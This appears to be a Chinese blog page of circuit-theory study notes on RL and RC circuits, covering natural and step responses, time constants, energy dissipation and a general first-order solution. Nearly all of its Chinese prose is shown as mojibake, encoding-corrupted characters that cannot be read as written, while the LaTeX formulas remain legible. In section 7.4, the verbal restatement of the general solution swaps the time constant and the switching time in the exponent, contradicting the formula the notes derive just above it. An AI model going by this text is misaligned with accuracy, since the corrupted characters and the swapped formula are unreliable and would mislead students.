ç”µè·¯å°±æ˜¯æœ‰ç”µé˜» $R$ å’Œç”µæ„Ÿ $L$ çš„ç”µè·¯.</p><p>åŒç†, $RC$ ç”µè·¯å°±æ˜¯æœ‰ç”µé˜» $R$ å’Œç”µå®¹ $C$ çš„ç”µè·¯.</p><p>è€ƒè™‘å­˜å‚¨åœ¨ç”µæ„Ÿæˆ–ç”µå®¹ä¸­çš„èƒ½é‡çªç„¶é‡Šæ”¾åˆ°ç”µé˜»ç½‘ç»œæ—¶äº§ç”Ÿçš„ç”µæµå’Œç”µå‹, å‘ç”Ÿåœ¨ç”µæ„Ÿæˆ–ç”µå®¹çªç„¶ä¸ç›´æµç”µæºæ–­å¼€, ç”µè·¯ç»“æ„å¦‚:</p><p><img src="/../img/two_circuit_to_analyze_intrinsic_response.png"></p><p>(è¿™é‡Œå¯ä»¥çœ‹å‡ºæ˜¯ç®€åŒ–çš„ç”µè·¯)</p><p>è¿™ç§ç»“æ„ä¸­äº§ç”Ÿçš„ç”µæµå’Œç”µå‹ç§°ä¸ºç”µè·¯çš„<mark>å›ºæœ‰å“åº”</mark> (å› ä¸ºä¸å—å¤–éƒ¨ç”µæºçš„ä½œç”¨, å–å†³äºç”µè·¯æœ¬èº«å›ºæœ‰çš„çŠ¶æ€, è‹±æ–‡ä¸º intrinsic response, intrinsic æœ‰å†…éƒ¨çš„, æœ¬è´¨çš„, æ„æ€), å›ºæœ‰å“åº”å°±æ˜¯ç”µå®¹æˆ–ç”µæ„Ÿ <mark>æ”¾ç”µçš„è¿‡ç¨‹</mark> </p><p>ç›´æµç”µå‹æˆ–ç”µæµæºçªç„¶åŠ åˆ°ä¸€ä¸ªç”µæ„Ÿæˆ–ç”µå®¹ä¸Š, ä½¿å…¶è·å¾—èƒ½é‡è€Œäº§ç”Ÿçš„ç”µæµå’Œç”µå‹, è¿™ç§å“åº”ç§°ä¸º <mark>é˜¶è·ƒå“åº” (step response)</mark> </p><p>ä¸€èˆ¬ $RL$ å’Œ $RC$ ç”µè·¯ç»“æ„çš„å››ç§å¯èƒ½å½¢å¼:</p><p><img src="/../img/four_style_of_RL_RC_circuit.png"></p><p>(è¿™é‡Œä¹Ÿå¯ä»¥è®¤ä¸ºæ˜¯, æ±‚è§£é˜¶è·ƒå“åº”å’Œå›ºæœ‰å“åº”ä¹‹å‰å…ˆå°†ç”µè·¯ç®€åŒ–ä¸ºæˆ´ç»´å—æˆ–è¯ºé¡¿ç”µè·¯, å› ä¸ºåç»­çš„å…¬å¼ä¹Ÿæ˜¯åŸºäºè¿™äº›ç”µè·¯ç»“æ„æ¥æ¨å¯¼çš„)</p><p>ç”±äºç”µå‹å’Œç”µæµç”±ä¸€é˜¶å¾®åˆ†æ–¹ç¨‹å¼è¡¨ç¤º, $RL$ å’Œ $RC$ ç”µè·¯ä¹Ÿç§° <mark>ä¸€é˜¶ç”µè·¯</mark><br>(ä¸è®ºå‡ºç°å¦‚ä½•å¤æ‚çš„ç”µè·¯å½¢å¼, å¦‚æœå¯å°†å®ƒç®€åŒ–æˆæˆ´ç»´å—æˆ–è¯ºé¡¿ç­‰æ•ˆç”µè·¯è¿æ¥åˆ°ä¸€ä¸ªç­‰æ•ˆç”µæ„Ÿæˆ–ç”µç­’ä¸¤ç«¯, å°±æ˜¯ä¸€ä¸ª <mark>ä¸€é˜¶ç”µè·¯</mark> )</p><p>é˜¶è·ƒå“åº”å°±æ˜¯ç”µå®¹æˆ–ç”µæ„Ÿ <mark>å……ç”µçš„è¿‡ç¨‹</mark> </p><h2 id="7-1-RL-ç”µè·¯çš„å›ºæœ‰å“åº”"><a href="#7-1-RL-ç”µè·¯çš„å›ºæœ‰å“åº”" class="headerlink" title="7.1 RL ç”µè·¯çš„å›ºæœ‰å“åº”"></a>7.1 RL ç”µè·¯çš„å›ºæœ‰å“åº”</h2><p>è®¡ç®—å½’çº³ (çœ‹äº†åé¢çš„å†…å®¹åˆå†™åœ¨å‰é¢çš„):</p><ol><li>æ±‚ç”µæ„Ÿçš„åˆå§‹ç”µæµ $I_0$</li><li>æ±‚ç”µè·¯çš„æ—¶é—´å¸¸æ•° $\tau &#x3D; L&#x2F;R$</li><li>ä½¿ç”¨ $i(t) &#x3D; I_0 e^{-t&#x2F;\tau}$, æ ¹æ® $I_0$ å’Œ $\tau$, æ±‚ $i(t)$</li></ol><p>ä¸€ä¸ªä¾‹å­:</p><p>ç”µè·¯ä¸­, å¼€å…³è¢«æ‰“å¼€ä¹‹å‰, ç”µè·¯ä¸­æœ‰æ’å®šç”µæµå­˜åœ¨, å› æ­¤ç”µæ„Ÿåœ¨é‡Šæ”¾æ‰€å­˜å‚¨çš„èƒ½é‡ä¹‹å‰è¡¨ç°ä¸ºçŸ­è·¯ ( $L \frac{di}{dt} &#x3D; 0$)</p><p>æ­¤<mark>æ±‚è§£å›ºæœ‰å“åº”</mark>æ—¶, éœ€è¦åœ¨å¼€å…³å·²ç»æ‰“å¼€ä¹‹å <mark>æ±‚è§£ç”µé˜»ç«¯çš„ç”µå‹å’Œç”µæµ</mark>.</p><p><img src="/../img/example_for_intrinsic_response.png"></p><p>åé¢æœ‰é€šç”¨è§£æ³•, ç»“æœä¸º:<br>$$<br>\displaylines{\therefore x(t) &#x3D; x_f + [x(t_0) - x_f] e^{-(t-t_0)&#x2F;\tau}<br>}<br>$$<br>(å…ˆç•™ä¸ªå°è±¡)</p><h3 id="7-1-1-æ¨å¯¼ç”µæµè¡¨è¾¾å¼"><a href="#7-1-1-æ¨å¯¼ç”µæµè¡¨è¾¾å¼" class="headerlink" title="7.1.1 æ¨å¯¼ç”µæµè¡¨è¾¾å¼"></a>7.1.1 æ¨å¯¼ç”µæµè¡¨è¾¾å¼</h3><p>ä¸»è¦éœ€è¦å¾—åˆ° <mark>ç”µæµéšæ—¶é—´å˜åŒ–çš„è¡¨è¾¾å¼</mark> , å³ $i(t)$. (æ±‚è§£å“åº”å°±æ˜¯æ±‚è§£å“åº”è¿‡ç¨‹ä¸­çš„ç”µæµå’Œç”µå‹çš„è¡¨è¾¾å¼)</p><p><img src="/../img/using_to_derive_current_equation.png"></p><blockquote><p>æ¨å¯¼</p></blockquote><p>åˆ©ç”¨åŸºå°”éœå¤«ç”µå‹å®šå¾‹, å¾—åˆ°:<br>$$<br>\displaylines{L \frac{di}{dt} + Ri &#x3D; 0}<br>$$</p><p>å·²çŸ¥ $R$ å’Œ $L$ æ˜¯å¸¸é‡, å› æ­¤:<br>$$<br>\displaylines{L \frac{di}{dt} + Ri &#x3D; 0 \newline~ \newline<br>\frac{di}{dt} dt &#x3D; - \frac{R}{L} i dt \newline~ \newline<br>\frac{di}{i} &#x3D; - \frac{R}{L} dt \newline~ \newline<br>\int_{i(t_0)}^{i(t)} \frac{dx}{x} &#x3D; - \frac{R}{L} \int_{t_0}^{t} dy \newline~ \newline<br>\ln \frac{i(t)}{i(0)} &#x3D; - \frac{R}{L}t \newline~ \newline<br>i(t) &#x3D; i(0) e^{-(R&#x2F;L)t}, \ \ t \ge 0<br>v &#x3D; iR &#x3D;I_0 R e^{-(R&#x2F;L)t}, \ \ t \ge 0^{+}<br>}<br>$$</p><p>å¯ä»¥çœ‹å‡º, ä»åˆå§‹ç”µæµ $I_0$ å¼€å§‹, éšç€ $t$ çš„å¢åŠ , æŒ‰æŒ‡æ•°è§„å¾‹å‡å°‘è¶‹äº 0.</p><p><img src="/../img/natual_log_RL_response.png"></p><p>æœ‰:</p><ul><li>$v(0^{-}) &#x3D; 0$</li><li>$v(0^{+}) &#x3D; I_0 R$</li></ul><blockquote><p>å¾—å‡ºç”µé˜»ä¸­çš„åŠŸç‡æŸè€—</p></blockquote><p>é€šè¿‡:<br>$$<br>\displaylines{p &#x3D; vi,\ \ p &#x3D; i^2R, \ \ p &#x3D; \frac{v^2}{R}}<br>$$<br>ä¹‹ä¸€, éƒ½å¯å¾—åˆ°:<br>$$<br>\displaylines{p &#x3D; I_0^2 R e^{-2(R&#x2F;L)t}, \ \ t \ge 0^{+}}<br>$$</p><blockquote><p>å¼€å…³æ‰“å¼€å, é‡Šæ”¾åˆ°ç”µé˜»çš„èƒ½é‡</p></blockquote><p>$$<br>\displaylines{w &#x3D; \int_0^t pdx}<br>$$</p><p>æ¥æ¨å¯¼, æœ€åå¾—åˆ° <mark>ç»“è®º</mark>, å½“ $t$ å˜æˆæ— ç©·å¤§æ—¶, æ¶ˆè€—åœ¨ç”µé˜»ä¸­çš„èƒ½é‡é€¼è¿‘å­˜å‚¨åœ¨ç”µæ„Ÿä¸­çš„åˆå§‹èƒ½é‡.</p><h3 id="7-1-2-æ—¶é—´å¸¸æ•°çš„æ„ä¹‰"><a href="#7-1-2-æ—¶é—´å¸¸æ•°çš„æ„ä¹‰" class="headerlink" title="7.1.2 æ—¶é—´å¸¸æ•°çš„æ„ä¹‰"></a>7.1.2 æ—¶é—´å¸¸æ•°çš„æ„ä¹‰</h3><p>æ—¶é—´å¸¸æ•°, å³ $i(t)$ è¡¨è¾¾å¼ä¸­ ( $e^{-(R&#x2F;L)t}$ é¡¹ ), æ—¶é—´ $t$ çš„ç³»æ•° (å³ $R&#x2F;L$) çš„å€’æ•°:<br>$$<br>\displaylines{\tau &#x3D;\ æ—¶é—´å¸¸æ•°\ &#x3D; L&#x2F;R}<br>$$<br>(æ¯•ç«Ÿ $L$ å’Œ $R$ æœ¬æ¥å°±æ˜¯å¸¸æ•°, å°†ä¸¤ä¸ªå¸¸æ•°æ•´åˆåˆ°ä¸€èµ·)</p><p>ä¸€ç»„å…¬å¼:<br>$$<br>\displaylines{i(t) &#x3D; I_0 e^{-t&#x2F;\tau},\ \ t \ge 0 \newline~ \newline<br>v(t) &#x3D; I_0 Re^{-t&#x2F;\tau},\ t \ge 0^{+} \newline~ \newline<br>p &#x3D; I_0^2 R e^{-2t&#x2F;\tau}, \ t \ge 0^{+} \newline~ \newline<br>w &#x3D; \frac{1}{2}L I_0^2 (1 - e^{-2t&#x2F;\tau}),\ t \ge 0 }<br>$$<br>(æ„Ÿè§‰åšåŠŸçš„å…¬å¼åŒæ ·éœ€è¦ç›´æ¥è®°ä½, å¾ˆå¤šé¢˜éƒ½è¦æ±‚è®¡ç®—)</p><p>åœ¨æ–­å¼€ç”µå‹æº&#x2F;ç”µæµæºå 5 ä¸ªæ—¶é—´å¸¸æ•°å, å¤§éƒ¨åˆ†çš„å®é™…æ•ˆæœæ˜¯, ç”µæµå’Œç”µå‹å·²ç»è¾¾åˆ°ç»ˆå€¼:</p><p><img src="/../img/value_of_e_when_t_equal_to_times_of_tau.png"></p><p><mark>ä»»ä½•ä¸€é˜¶ç”µè·¯éƒ½å…·æœ‰æ—¶é—´å¸¸æ•°ç‰¹æ€§</mark>.</p><p><mark>æ—¶é—´å¸¸æ•°å¦ä¸€ä¸ªé‡è¦ç‰¹æ€§:</mark> å¦‚æœç”µæµä»¥åˆå§‹é€Ÿç‡å˜åŒ–, æ—¶é—´å¸¸æ•°åˆ™ç»™å‡ºäº†ç”µæµè¾¾åˆ°æœ€ç»ˆå€¼æ‰€éœ€çš„æ—¶é—´. (æ³¨æ„è¿™é‡Œçš„æ¡ä»¶æ˜¯, ä»¥åˆå§‹é€Ÿç‡å˜åŒ–)</p><p>ç¤ºä¾‹:<br>å‡è®¾ç”µæµè¿ç»­ä»¥ä»¥ä¸‹é€Ÿç‡å˜åŒ–:<br>$$<br>\displaylines{ I_0 R &#x3D; L \frac{di}{dt} \newline~ \newline<br>\frac{di}{dt}(0^{+}) &#x3D; - \frac{R}{L}I_0 &#x3D; - \frac{I_0}{\tau}}<br>$$</p><p>å¦‚æœ $i$ çš„åˆå€¼ä¸º $I_0$, åˆ™ $i$ çš„è¡¨è¾¾å¼å˜æˆ:<br>$$<br>\displaylines{i &#x3D; I_0 - \frac{I_0}{\tau}t}<br>$$<br>å°±å¯ä»¥çœ‹å‡º, æ—¶é—´ä¸º $\tau$ æ—¶ $i$ å˜ä¸ºé›¶.</p><p>å¯ä»¥é€šè¿‡ä¸æ—¶é—´è½´çš„äº¤ç‚¹æ±‚ $\tau$ çš„å€¼:</p><p><img src="/../img/get_the_value_of_tau.png"></p><p><mark>ç”±äºç”µæµä¸ä¼šè·ƒå˜</mark>, å› æ­¤æ–­å¼€ç”µæºä¹‹å‰çš„ç”µæµå°±æ˜¯å“åº”çš„åˆå§‹ç”µæµ.</p><p><mark>æ±‚æ¶ˆè€—çš„æ€»èƒ½é‡</mark> , ç”¨ç§¯åˆ†åˆ° $\infty$ , å¦‚:<br>$$<br>\displaylines{w(t) &#x3D; \int_0^\infty 2560e ^{-10t}dt &#x3D; 256J}<br>$$</p><p><mark>æ±‚åˆå§‹èƒ½é‡</mark> , å¦‚:<br>$$<br>\displaylines{w(0) &#x3D; \frac{1}{2}L i^2 (0) &#x3D; \frac{1}{2} \times (2) \times (400) &#x3D; 400J}<br>$$</p><p><mark>æ±‚å­˜å‚¨åœ¨å¹¶è”ç”µæ„Ÿä¸­çš„åˆå§‹èƒ½é‡</mark> , åˆ«ç”¨ç­‰æ•ˆç”µæ„Ÿæ±‚, åˆ†å¼€æ±‚.</p><h2 id="7-2-RC-ç”µè·¯çš„å›ºæœ‰å“åº”"><a href="#7-2-RC-ç”µè·¯çš„å›ºæœ‰å“åº”" class="headerlink" title="7.2 RC ç”µè·¯çš„å›ºæœ‰å“åº”"></a>7.2 RC ç”µè·¯çš„å›ºæœ‰å“åº”</h2><p>RC ç”µè·¯çš„å›ºæœ‰å“åº”ç±»ä¼¼äº RL ç”µè·¯çš„å“åº”.</p><p>RC ç”µè·¯çš„å›ºæœ‰å“åº”æ˜¯ä»ä¸‹å›¾ç”µè·¯å‘å±•è€Œæ¥, ä¸”ç”µå®¹ä¸¤ç«¯çš„ç”µå‹æ— è·ƒå˜ (æ„æ€æ˜¯é‡Šæ”¾æ—¶, åˆå§‹ç”µå‹ä¸ºç¨³æ€æ—¶çš„ç”µå‹):</p><p><img src="/../img/RC_circuit_coming.png"></p><h3 id="7-2-1-æ¨å¯¼ç”µå‹è¡¨è¾¾å¼"><a href="#7-2-1-æ¨å¯¼ç”µå‹è¡¨è¾¾å¼" class="headerlink" title="7.2.1 æ¨å¯¼ç”µå‹è¡¨è¾¾å¼"></a>7.2.1 æ¨å¯¼ç”µå‹è¡¨è¾¾å¼</h3><p>å…¬å¼ä¸º (åç»­æ¨å¯¼):<br>$$<br>\displaylines{v(t) &#x3D; V_0 e^{-t&#x2F;\tau}, \ \ t \ge 0}<br>$$<br>$$<br>\displaylines{i(t) &#x3D; \frac{v(t)}{R} &#x3D; \frac{V_0}{R}e^{-t&#x2F;\tau}, \ \ t \ge 0^{+} \newline~ \newline<br>p &#x3D; vi &#x3D; \frac{V_0^2}{R}e^{-2t&#x2F;\tau}, \ \ t \ge 0^{+} \newline~ \newline<br>w &#x3D; \int_0^t p dx &#x3D; \int_0^t \frac{V_0^2}{R} e^{-2x&#x2F;\tau} dx &#x3D; \frac{1}{2}C V_0^2(1 - e^{-2t&#x2F;\tau}), \ \ t \ge 0<br>}<br>$$</p><p>(å¯ä»¥çœ‹å‡ºå½¢å¼å’Œ RL ç”µè·¯ä¸€æ ·, åªéœ€è¦è®°ä½è¿™é‡Œçš„æ—¶é—´å¸¸æ•°çš„å«ä¹‰ä¸åŒ)</p><p>é€šè¿‡, èŠ‚ç‚¹ç”µå‹æ³•:</p><p><img src="/../img/derive_the_formula_of_RC_voltage.png"></p><p>$$<br>\displaylines{C \frac{dv}{dt} + \frac{v}{R} &#x3D; 0}<br>$$</p><p>(ä¸ºä»€ä¹ˆæœ‰ $C \frac{dv}{dt}$, è¿™é‡Œåº”è¯¥æ˜¯ä½ç§»ç”µæµ, å³ç”µå®¹ä¸Šç”µè·å˜åŒ–å¼•å‘çš„, æ±‚ç”µæµ, å¯ä»¥ç”¨ $I &#x3D; \frac{dq}{dt}$, æ±‚ç”µè·, ç”¨ $C &#x3D; \frac{Q}{U}, \ \ Q &#x3D; CU$, æœ€ç»ˆå¾—åˆ°ä¸Šè¿°å¼å­)</p><blockquote><p>æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{ \frac{dv}{dt} &#x3D; - \frac{v}{RC} \newline~ \newline<br>\frac{dv}{v} &#x3D; - \frac{dt}{RC} \newline~ \newline<br>\int \frac{1}{v} dv &#x3D; - \frac{1}{RC} \int dt \newline~ \newline<br>\ln v &#x3D; -\frac{1}{RC}t \newline~ \newline<br>v(t) &#x3D; v(0)e^{-t&#x2F;RC},\ \ t \ge 0<br>}<br>$$</p><p>è¿™é‡Œ, ç”µå®¹ä¸Šçš„åˆå§‹ç”µå‹ä¸º:<br>$$<br>\displaylines{v(0^{-}) &#x3D; v(0) &#x3D; v(0^{+}) &#x3D; V_g &#x3D; V_0}<br>$$</p><p>RC ç”µè·¯çš„æ—¶é—´å¸¸æ•°ä¸º:<br>$$<br>\displaylines{\tau &#x3D; RC}<br>$$</p><p>æœ€ç»ˆå…¬å¼ä¸º:<br>$$<br>\displaylines{v(t) &#x3D; V_0 e^{-t&#x2F;\tau}, \ \ t \ge 0}<br>$$</p><p>åŒæ ·, ç»™å‡º $i,\ p, \ w$ çš„è¡¨è¾¾å¼:<br>$$<br>\displaylines{i(t) &#x3D; \frac{v(t)}{R} &#x3D; \frac{V_0}{R}e^{-t&#x2F;\tau}, \ \ t \ge 0^{+} \newline~ \newline<br>p &#x3D; vi &#x3D; \frac{V_0^2}{R}e^{-2t&#x2F;\tau}, \ \ t \ge 0^{+} \newline~ \newline<br>w &#x3D; \int_0^t p dx &#x3D; \int_0^t \frac{V_0^2}{R} e^{-2x&#x2F;\tau} dx &#x3D; \frac{1}{2}C V_0^2(1 - e^{-2t&#x2F;\tau}), \ \ t \ge 0<br>}<br>$$</p><p>è®¡ç®— RC ç”µè·¯çš„å›ºæœ‰å“åº”å½’çº³:</p><ol><li>æ±‚ç”µå®¹çš„åˆå§‹ç”µå‹ $V_0$</li><li>æ±‚ç”µè·¯çš„æ—¶é—´å¸¸æ•° $\tau &#x3D; RC$</li><li>ä½¿ç”¨ $v(t) &#x3D; V_0 e^{-t&#x2F;\tau}$, æ ¹æ® $V_0$ å’Œ $\tau$ æ±‚ $v(t)$</li></ol><blockquote><p>ä¾‹é¢˜</p></blockquote><p><img src="/../img/example_of_RC_circuit.png"></p><p>è¿™ç§é¢˜æ±‚ $v_1(t)$ å’Œ $v_2(t)$ æ—¶éœ€è¦å…ˆæ±‚å‡º, $v(t)$ å’Œ $i(t)$, å†åˆ©ç”¨ $v &#x3D; \frac{1}{C} \int_{t_0}^t i dx + V(0)$ æ±‚å¾—. (è¿™é“é¢˜ä¸èƒ½ç›´æ¥æ±‚çš„åŸå› å¯èƒ½æ˜¯, æ¯”å¦‚å•ç‹¬æ±‚ $C_1$, æ­¤æ—¶çš„æ¨¡å‹ä¸æ˜¯æˆ´ç»´å—ç”µè·¯, æ¯•ç«Ÿè¿˜æœ‰ä¸€ä¸ªç”µæº)</p><h2 id="7-3-RL-å’Œ-RC-ç”µè·¯çš„é˜¶è·ƒå“åº”"><a href="#7-3-RL-å’Œ-RC-ç”µè·¯çš„é˜¶è·ƒå“åº”" class="headerlink" title="7.3 RL å’Œ RC ç”µè·¯çš„é˜¶è·ƒå“åº”"></a>7.3 RL å’Œ RC ç”µè·¯çš„é˜¶è·ƒå“åº”</h2><p>ä¸€ä¸ªæ’å®šç”µå‹æºå’Œç”µæµæºçªç„¶ä½œç”¨äºä¸€ä¸ªç”µè·¯, å…¶å“åº”ç§°ä¸º<mark>ç”µè·¯çš„é˜¶è·ƒå“åº”</mark>.</p><h3 id="7-3-1-RL-ç”µè·¯çš„é˜¶è·ƒå“åº”"><a href="#7-3-1-RL-ç”µè·¯çš„é˜¶è·ƒå“åº”" class="headerlink" title="7.3.1 RL ç”µè·¯çš„é˜¶è·ƒå“åº”"></a>7.3.1 RL ç”µè·¯çš„é˜¶è·ƒå“åº”</h3><p>åˆ©ç”¨:</p><p><img src="/../img/RL_step_response.png"></p><p>ä»¥åŠåŸºå°”éœå¤«å®šå¾‹ç”µå‹å®šå¾‹æ¥æ¨å¯¼.</p><blockquote><p>æ¨å¯¼å¦‚ä¸‹:</p></blockquote><p>$$<br>\displaylines{V_s &#x3D; Ri + L \frac{di}{dt} \newline~ \newline<br>\frac{di}{dt} &#x3D; \frac{-Ri + V_s}{L} &#x3D; \frac{-R}{L}(i- \frac{V_s}{R}) \newline~ \newline<br>\frac{di}{dt}dt &#x3D;\frac{-Ri + V_s}{L} &#x3D; \frac{-R}{L}(i- \frac{V_s}{R})dt \newline~ \newline<br>di &#x3D; \frac{-Ri + V_s}{L} &#x3D; \frac{-R}{L}(i- \frac{V_s}{R})dt \newline~ \newline<br>\frac{di}{i- \frac{V_s}{R}} &#x3D; \frac{-R}{L}dt \newline~ \newline<br>\int_{I_0}^{i(t)}\frac{di}{i- \frac{V_s}{R}} &#x3D; \frac{-R}{L}\int_0^t dy \newline~ \newline<br>\ln \frac{i(t) - (V_s&#x2F;R)}{I_0 - (V_s&#x2F;R)} &#x3D; - \frac{R}{L}t \newline~ \newline<br>\therefore i(t) &#x3D; \frac{V_s}{R} + (I_0 - \frac{V_s}{R})e^{(-R&#x2F;L)t} \newline~ \newline<br>&#x3D; \frac{V_s}{R} - \frac{V_s}{R} e^{-(R&#x2F;L)t}, \ \ when\ I_0 &#x3D; 0<br>}<br>$$</p><p><mark>æ—¶é—´å¸¸æ•°</mark> åŒæ ·æ˜¯ $\frac{L}{R}$, å¼€å…³å…³é—­åçš„ä¸€ä¸ªæ—¶é—´å¸¸æ•°, ç”µæµå°†å¤§çº¦è¾¾åˆ°å…¶æœ€ç»ˆå€¼çš„ <code>63%</code>:<br>$$<br>\displaylines{i(\tau) &#x3D; \frac{V_s}{R} - \frac{V_s}{R} e^{-1} \approx 0.6321\frac{V_s}{R} }<br>$$</p><p>é€šè¿‡æ¬§å§†å®šå¾‹å¯ä»¥å¾—å‡º, å¼€å…³å…³é—­ç¬é—´, ç”µæ„Ÿä¸Šçš„ç”µå‹ä¸º (åˆ©ç”¨ $v &#x3D; L \frac{di}{dt} $æ±‚å¾—):<br>$$<br>\displaylines{v &#x3D; -R (\frac{V_s}{R} + (I_0 - \frac{V_s}{R})e^{(-R&#x2F;L)t}) &#x3D; (V_s - I_0 R)e^{-(R&#x2F;L)t}}<br>$$<br>å³ $V_s - I_0R$. ç„¶åæŒ‰æŒ‡æ•°è§„å¾‹è¡°å‡åˆ°é›¶.</p><h3 id="7-3-2-RC-ç”µè·¯çš„é˜¶è·ƒå“åº”"><a href="#7-3-2-RC-ç”µè·¯çš„é˜¶è·ƒå“åº”" class="headerlink" title="7.3.2 RC ç”µè·¯çš„é˜¶è·ƒå“åº”"></a>7.3.2 RC ç”µè·¯çš„é˜¶è·ƒå“åº”</h3><p>åˆ©ç”¨:</p><p><img src="/../img/derive_the_equation_of_RC_circuit.png"></p><p>å’ŒåŸºå°”éœå¤«ç”µæµå®šå¾‹:<br>$$<br>\displaylines{C \frac{dv_C}{dt} + \frac{V_C}{R} &#x3D; I_s \newline~ \newline<br>\frac{dv_C}{dt} + \frac{v_C}{RC} &#x3D; \frac{I_s}{C}}<br>$$</p><p>æœ€ç»ˆå¯ä»¥æ¨å¯¼å‡º:<br>$$<br>\displaylines{v_c &#x3D; I_sR + (V_0 - I_sR)e^{-t&#x2F;RC}, \ \ t \ge 0}<br>$$</p><p>æˆ–ä»:<br>$$<br>\displaylines{ \frac{di}{dt} + \frac{1}{RC}i &#x3D; 0  }<br>$$</p><p>å¯ä»¥æ¨å¯¼å‡º:<br>$$<br>\displaylines{i &#x3D; (I_s - \frac{V_0}{R})e^{-t&#x2F;RC}, \ \ t \ge 0^{+}}<br>$$</p><h2 id="7-4-é˜¶è·ƒå“åº”å’Œå›ºæœ‰å“åº”çš„ä¸€èˆ¬è§£æ³•"><a href="#7-4-é˜¶è·ƒå“åº”å’Œå›ºæœ‰å“åº”çš„ä¸€èˆ¬è§£æ³•" class="headerlink" title="7.4 é˜¶è·ƒå“åº”å’Œå›ºæœ‰å“åº”çš„ä¸€èˆ¬è§£æ³•"></a>7.4 é˜¶è·ƒå“åº”å’Œå›ºæœ‰å“åº”çš„ä¸€èˆ¬è§£æ³•</h2><p>è®© $x(t)$ çš„ 4 ç§å¯èƒ½å€¼, æ¥ä»£è¡¨ç”µæ„Ÿç«¯çš„ç”µæµæˆ–ç”µå‹, æˆ–ç”µå®¹ç«¯çš„ç”µæµæˆ–ç”µå‹.</p><p><img src="/../img/four_style_of_RL_RC_circuit.png"></p><p>æè¿° 4 ä¸ªç”µè·¯ä¸­ä»»æ„ä¸€ä¸ª, çš„å¾®åˆ†æ–¹ç¨‹çš„å½¢å¼:<br>$$<br>\displaylines{ \frac{dx}{dt} + \frac{x}{\tau} &#x3D; K}<br>$$<br>(ä»å½¢å¼ä¸Šå¯ä»¥çœ‹å‡º, è¿™æ˜¯ç”±åŸºå°”éœå¤«å®šå¾‹å®šå¾‹å†™å‡ºçš„, $\frac{dx}{dt}$ å°±æ˜¯ $L \frac{di}{dt}$ å’Œ $C \frac{dv}{dt}$ çš„å½¢å¼, ä¹Ÿå¯ä»¥çœ‹æˆæ˜¯ $\frac{x}{\tau}$ åŠ ä¸Šä¸€ä¸ªå˜åŒ–é‡)</p><p>å…¶ä¸­ $K$ å¸¸é‡å€¼å¯ä»¥ä¸ºé›¶.</p><p>ç”±äºè¿™ä¸ªç”µè·¯çš„ç”µæºæ˜¯æ’å®šç”µå‹æˆ–ç”µæµ, æ‰€ä»¥ $x$ çš„ç»ˆå€¼å°†æ˜¯å¸¸é‡:<br>$$<br>\displaylines{x_f &#x3D; K \tau}<br>$$</p><p>è¿™é‡Œ $x_f$ ä»£è¡¨å˜é‡çš„ç»ˆå€¼, ä¸”å½“ $x$ è¾¾åˆ°ç»ˆå€¼æ—¶, å¯¼æ•° $\frac{dx}{dt}$ å¿…é¡»ä¸ºé›¶.</p><blockquote><p>æ¨å¯¼</p></blockquote><p>$$<br>\displaylines{ \frac{dx}{dt} + \frac{x}{\tau} &#x3D; K \newline~ \newline<br>\frac{dx}{dt} &#x3D; - \frac{x}{\tau} + K &#x3D; - \frac{x- K \tau}{\tau} &#x3D; \frac{x- x_f}{\tau}, \ \ x_f &#x3D; K \tau \newline~ \newline<br>\frac{dx}{x - x_f} &#x3D; - \frac{1}{\tau}dt \newline~ \newline<br>\int_{x(t_0)}^{x(t)} \frac{du}{u - x_f} &#x3D; - \frac{1}{\tau} \int_{t_0}^t dv \newline~ \newline<br>\therefore x(t) &#x3D; x_f + [x(t_0) - x_f] e^{-(t-t_0)&#x2F;\tau}<br>}<br>$$</p><p><mark>æ–‡å­—æè¿°</mark>:</p><blockquote><p>$ä½œä¸ºæ—¶é—´å‡½æ•°çš„æœªçŸ¥å˜é‡ &#x3D; å˜é‡ç»ˆå€¼ + [ å˜é‡åˆå€¼ - å˜é‡ç»ˆå€¼ ] \times e^{- \frac{[t - æ—¶é—´å¸¸æ•°]}{æ¢è·¯æ—¶é—´}}$</p></blockquote><p>è®¡ç®—é˜¶è·ƒå’Œå›ºæœ‰å“åº”æ—¶, å¯ä»¥é‡‡ç”¨çš„æ­¥éª¤:</p><ol><li>ç¡®å®šç”µè·¯çš„æœ‰å…³å˜é‡. $RC$ ç”µè·¯, é€‰æ‹©ç”µå®¹ç”µå‹, $RL$ ç”µè·¯, é€‰æ‹©ç”µæ„Ÿç”µæµ</li><li>å†³å®šå˜é‡çš„åˆå§‹å€¼, å³åœ¨ $t_0$ æ—¶çš„å€¼. é€‰æ‹©ç”µå®¹ç”µå‹æˆ–ç”µæ„Ÿç”µæµä½œä¸ºå…³å¿ƒçš„å˜é‡ä¸ç”¨åŒºåˆ† $t &#x3D; t_0^{-}$ å’Œ $t &#x3D; t_0^{+}$, é€‰æ‹©å¦ä¸€ä¸ªå˜é‡, éœ€è¦è®°ä½å®ƒçš„åˆå€¼æ˜¯å®šä¹‰åœ¨ $t &#x3D; t_0^{+}$ æ—¶</li><li>è®¡ç®—å˜é‡çš„ç»ˆå€¼, å³å½“ $t -&gt; \infty$ æ—¶çš„å€¼</li><li>è®¡ç®—ç”µè·¯çš„æ—¶é—´å¸¸æ•°</li></ol><p><mark>åˆ¤æ–­ $v_C$ çš„åˆå€¼</mark> , æ³¨æ„ç”µå®¹çš„å‚è€ƒç”µå‹æ–¹å‘:</p><p><img src="/../img/refer_dir_of_capa.png"></p><p><mark>ç”µå®¹çš„å³°å€¼ç”µå‹</mark> , å°±æ˜¯ä¸¤ä¾§æ‰€åŠ çš„æœ€å¤§ç”µå‹.</p><p><mark>ç”µå®¹ä¸­çš„ç”µæµå¯ä»¥è·ƒå˜, ç”µæ„Ÿä¸­çš„ç”µå‹å¯ä»¥è·ƒå˜</mark> </p><p><mark>æ±‚è§£ç”µå®¹ç”µå‹å˜æˆé›¶ä¹‹å‰, å¼€å…³åœ¨ä½ç½® b å¤šé•¿æ—¶é—´</mark> , å¦‚ $v_C(t) &#x3D; 90 - 120e^{-5t}, \ \ t \ge 0$, å³æ±‚ $v_C(t) &#x3D; 0$ æ—¶çš„æ—¶é—´.</p><p><mark>ç”»æ³¢å½¢å›¾</mark> , ä¸»è¦å…ˆæ‰¾å‡ºä¸è½´çº¿çš„äº¤ç‚¹.</p><p><mark>æ±‚ç£è€¦åˆçº¿åœˆç”µè·¯çš„é˜¶è·ƒå“åº”</mark> , ç£è€¦åˆçº¿åœˆå¯ä»¥ç”±å•ä¸ªå…·æœ‰æ„Ÿåº”çš„ç”µæ„Ÿä»£æ›¿:</p><p><img src="/../img/inductance_of_coupling_be_replaced_by_one_inductance.png"></p><p>$$<br>\displaylines{L_{eq} 